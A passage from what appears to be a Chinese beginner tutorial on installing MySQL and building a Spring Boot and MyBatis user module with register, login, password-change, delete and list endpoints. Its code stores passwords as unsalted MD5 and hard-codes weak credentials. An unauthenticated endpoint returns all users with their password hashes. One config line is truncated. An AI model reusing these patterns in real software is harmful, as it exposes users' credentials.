默认使用“mysql_native_password”插件认证</span></span><br><span class="line"><span class="attr">default_authentication_plugin</span>=mysql_native_password</span><br><span class="line"><span class="comment"># 去除mysql8对ONLY_FULL_GROUP_BY的限制</span></span><br><span class="line"><span class="attr">sql_mode</span>=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,ERROR_FOR_DIVISI</span><br><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="comment"># 设置mysql客户端默认字符集</span></span><br><span class="line"><span class="attr">default-character-set</span>=utf8mb4</span><br><span class="line"><span class="section">[client]</span></span><br><span class="line"><span class="comment"># 设置mysql客户端连接服务端时默认使用的端⼝和默认字符集</span></span><br><span class="line"><span class="attr">port</span>=<span class="number">3306</span></span><br><span class="line"><span class="attr">default-character-set</span>=utf8mb4</span><br></pre></td></tr></table></figure>

<p>进入管理员模式的命令行后，移动到bin路径下</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241025193934502.png"></p>
<p>初始化mysql，得到默认密码<code> .rcnizekl4Jt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqld --initialize --console</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241019172145305.png"></p>
<p>进行mysql服务安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqld --install &quot;MySQL&quot; --defaults-file=&quot;D:\work\mysql\my.ini&quot;</span><br></pre></td></tr></table></figure>

<p>不过启动不成功，先把刚刚安装的删了，修改下安装命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqld --remove &quot;MySQL&quot;</span><br><span class="line">mysqld --install</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241019172241650.png"></p>
<p>我们进行登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p .rcnizekl4Jt</span><br></pre></td></tr></table></figure>

<p>提示需要更改密码，我们重置一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;root&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241025194438931.png"></p>
<p>最后配置一下环境变量即可</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241025194600794.png"></p>
<h3 id="数据表创建"><a href="#数据表创建" class="headerlink" title="数据表创建"></a>数据表创建</h3><p>先新建个数据库，默认就可以</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241025195454035.png"></p>
<p>然后新建查询，创建我们要用到的表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_user` (</span><br><span class="line">`id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">`nickname` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;昵称&#x27;</span>,</span><br><span class="line">`username` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;账号&#x27;</span>,</span><br><span class="line">`password` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">`create_time` <span class="type">varchar</span>(<span class="number">40</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">`del_status` <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;删除状态0删除，1存在&#x27;</span>,</span><br><span class="line"><span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241025195653438.png"></p>
<p>可以看到创建成功</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241025195737304.png"></p>
<p>插入两条数据试试</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user (`nickname`,`username`,`password`,`create_time`,`del_status`)</span><br><span class="line"><span class="keyword">values</span>(&quot;⽤户1&quot;,&quot;user1&quot;,&quot;e10adc3949ba59abbe56e057f20f883e&quot;,&quot;2024-10-01 13:</span><br><span class="line">00:41&quot;,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user (`nickname`,`username`,`password`,`create_time`,`del_status`)</span><br><span class="line"><span class="keyword">values</span>(&quot;⽤户2&quot;,&quot;user2&quot;,&quot;e10adc3949ba59abbe56e057f20f883e&quot;,&quot;2024-10-01 13:</span><br><span class="line">00:41&quot;,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241025195921563.png"></p>
<p>检查一下成功插入数据</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241025200003695.png"></p>
<h2 id="第三部分：学习java中ORM框架-mybatis"><a href="#第三部分：学习java中ORM框架-mybatis" class="headerlink" title="第三部分：学习java中ORM框架 mybatis"></a>第三部分：学习java中ORM框架 mybatis</h2><h3 id="mybatis的作用"><a href="#mybatis的作用" class="headerlink" title="mybatis的作用"></a>mybatis的作用</h3><ol>
<li>简化数据库操作</li>
</ol>
<p>MyBatis允许开发者通过XML或注解的方式定义SQL语句，简化JDBC的繁琐操作，比如连接管理，语句创建和结果处理。</p>
<ol start="2">
<li>灵活的SQL映射</li>
</ol>
<p>与ORM（对象关系映射）框架不同，MyBatis允许开发者直接编写SQL语句，提供了更大的灵活性和控制权，适合复杂的查询和性能调优。</p>
<ol start="3">
<li>对象映射</li>
</ol>
<p>MyBatis能够将数据库查询结果映射到java对象，支持复杂的对象关系映射，使得数据处理更加便捷。</p>
<h3 id="项目引入mybatis"><a href="#项目引入mybatis" class="headerlink" title="项目引入mybatis"></a>项目引入mybatis</h3><p>打开pom.xml文件，引入mybatis依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--mybatis依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Mysql驱动包 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.29<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开配置文件application.properties，添加一下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring.application.name=testMysql</span><br><span class="line">server.port=8087</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### mybatis</span><br><span class="line">mybatis.mapper-locations=classpath:/mybatis-mapper/*Mapper.xml</span><br><span class="line">mybatis.configuration.map-underscore-to-camel-case=true</span><br><span class="line"></span><br><span class="line">### xxl-job, datasource</span><br><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/testdb?useUnicode=true&amp;useSSL=false&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;serverTimezone=Asia/Shanghai</span><br><span class="line">spring.datasource.username=root</span><br><span class="line">spring.datasource.password=123456</span><br><span class="line">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span><br><span class="line"></span><br><span class="line">### datasource-pool</span><br><span class="line">spring.datasource.type=com.zaxxer.hikari.HikariDataSource</span><br><span class="line">spring.datasource.hikari.minimum-idle=10</span><br><span class="line">spring.datasource.hikari.maximum-pool-size=30</span><br><span class="line">spring.datasource.hikari.auto-commit=true</span><br><span class="line">spring.datasource.hikari.idle-timeout=30000</span><br><span class="line">spring.datasource.hikari.pool-name=HikariCP</span><br><span class="line">spring.datasource.hikari.max-lifetime=900000</span><br><span class="line">spring.datasource.hikari.connection-timeout=10000</span><br><span class="line">spring.datasource.hikari.connection-test-query=SELECT 1</span><br><span class="line">spring.datasource.hikari.validation-timeout=1000</span><br></pre></td></tr></table></figure>

<h3 id="实现完整的用户模块"><a href="#实现完整的用户模块" class="headerlink" title="实现完整的用户模块"></a>实现完整的用户模块</h3><h4 id="编写接口"><a href="#编写接口" class="headerlink" title="编写接口"></a>编写接口</h4><h5 id="用户注册"><a href="#用户注册" class="headerlink" title="用户注册"></a>用户注册</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/register&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">save</span><span class="params">(<span class="meta">@RequestBody</span> TUser user)</span>&#123;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user.getUsername() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(user.getUsername()))&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;username不能为空&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user.getPassword() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(user.getPassword()))&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;password不能为空&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user.getNickname() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(user.getNickname()))&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;nickname不能为空&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">TUser</span> <span class="variable">exist</span> <span class="operator">=</span> userService.queryUserByUsername(user.getUsername());</span><br><span class="line">    <span class="keyword">if</span> (exist != <span class="literal">null</span>)&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;username已存在，请更改&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    user.setPassword(MD5Utils.string2MD5(user.getPassword()));</span><br><span class="line">    user.setCreateTime(DateUtils.getTime());</span><br><span class="line">    user.setDelStatus(<span class="number">1</span>);</span><br><span class="line">    userService.save(user);</span><br><span class="line"></span><br><span class="line">    jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    jo.setMsg(<span class="string">&quot;注册成功&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mybatis代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;save&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.example.testmysql.entity.TUser&quot;</span> <span class="attr">useGeneratedKeys</span>=<span class="string">&quot;true&quot;</span> <span class="attr">keyProperty</span>=<span class="string">&quot;id&quot;</span> &gt;</span></span><br><span class="line">    insert into t_user (</span><br><span class="line">    `username`,</span><br><span class="line">    `password`,</span><br><span class="line">    `nickname`,</span><br><span class="line">    `create_time`,</span><br><span class="line">    `del_status`</span><br><span class="line">    ) VALUES (</span><br><span class="line">    #&#123;username&#125;,</span><br><span class="line">    #&#123;password&#125;,</span><br><span class="line">    #&#123;nickname&#125;,</span><br><span class="line">    #&#123;createTime&#125;,</span><br><span class="line">    #&#123;delStatus&#125;</span><br><span class="line">    );</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/login&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">login</span><span class="params">(<span class="meta">@RequestBody</span> TUser user)</span>&#123;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user.getUsername() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(user.getUsername()))&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;username不能为空&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user.getPassword() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(user.getPassword()))&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;password不能为空&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TUser</span> <span class="variable">exist</span> <span class="operator">=</span> userService.queryUserByUsername(user.getUsername());</span><br><span class="line">    <span class="keyword">if</span> (exist == <span class="literal">null</span>)&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;username不存在，请先注册&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!MD5Utils.passwordIsTrue(user.getPassword(),exist.getPassword()))&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;密码错误，请重试&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    jo.setMsg(<span class="string">&quot;登录成功&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mybatis代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryUserByUsername&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;string&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.testmysql.entity.TUser&quot;</span>&gt;</span></span><br><span class="line">    select * from t_user where username = #&#123;username&#125; and del_status = 1</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/updatePassword&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">updatePassword</span><span class="params">(<span class="meta">@RequestBody</span> UpdateUser user)</span>&#123;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user.getUsername() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(user.getUsername()))&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;username不能为空&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user.getOldPassword() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(user.getOldPassword()))&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;旧密码不能为空&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user.getNewPassword() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(user.getNewPassword()))&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;新密码不能为空&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TUser</span> <span class="variable">exist</span> <span class="operator">=</span> userService.queryUserByUsername(user.getUsername());</span><br><span class="line">    <span class="keyword">if</span> (exist == <span class="literal">null</span>)&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;username不存在，请先注册&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!MD5Utils.passwordIsTrue(user.getOldPassword(),exist.getPassword()))&#123;</span><br><span class="line">        jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;旧密码错误，请重试&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    user.setNewPassword(MD5Utils.string2MD5(user.getNewPassword()));</span><br><span class="line">    userService.updatePassword(user);</span><br><span class="line"></span><br><span class="line">    jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    jo.setMsg(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mybatis代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updatePassword&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.example.testmysql.entity.UpdateUser&quot;</span>&gt;</span></span><br><span class="line">    update t_user set password = #&#123;newPassword&#125; where username = #&#123;username&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/deleteUser&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">deleteUser</span><span class="params">(<span class="meta">@RequestBody</span> TUser user)</span> &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (user.getUsername() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(user.getUsername()))&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;username不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user.getPassword() == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(user.getPassword()))&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;password不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TUser</span> <span class="variable">exist</span> <span class="operator">=</span> userService.queryUserByUsername(user.getUsername());</span><br><span class="line">        <span class="keyword">if</span> (exist == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;username不存在，请先注册&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!MD5Utils.passwordIsTrue(user.getPassword(),exist.getPassword()))&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;密码错误，请重试&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        userService.deleteUser(user);</span><br><span class="line"></span><br><span class="line">        jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;删除成功&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>mybatis代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;deleteUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.example.testmysql.entity.UpdateUser&quot;</span>&gt;</span></span><br><span class="line">    update t_user set del_status = 0 where username = #&#123;username&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="查询所有用户"><a href="#查询所有用户" class="headerlink" title="查询所有用户"></a>查询所有用户</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/queryAllUser&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">queryAllUser</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">    List&lt;TUser&gt; users = userService.queryAllUser();</span><br><span class="line"></span><br><span class="line">    jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    jo.setMsg(<span class="string">&quot;查询成功&quot;</span>);</span><br><span class="line">    jo.setO(users);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mybatis代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryAllUser&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.testmysql.entity.TUser&quot;</span>&gt;</span></span><br><span class="line">    select * from t_user</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="测试接口"><a href="#测试接口" class="headerlink" title="测试接口"></a>测试接口</h4><h5 id="用户注册-register"><a href="#用户注册-register" class="headerlink" title="用户注册 &#x2F;register"></a>用户注册 &#x2F;register</h5><p>发送注册信息</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;nickname&quot;</span><span class="punctuation">:</span><span class="string">&quot;rev1ve&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241025202743623.png"></p>
<h5 id="用户登录-login"><a href="#用户登录-login" class="headerlink" title="用户登录 &#x2F;login"></a>用户登录 &#x2F;login</h5><p>发送登录json数据包</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241025203052433.png"></p>
<h5 id="修改密码-updatePassword"><a href="#修改密码-updatePassword" class="headerlink" title="修改密码 &#x2F;updatePassword"></a>修改密码 &#x2F;updatePassword</h5><p>新旧密码的参数可以在<code>/entity/UpdateUser.java</code>类找到</p>
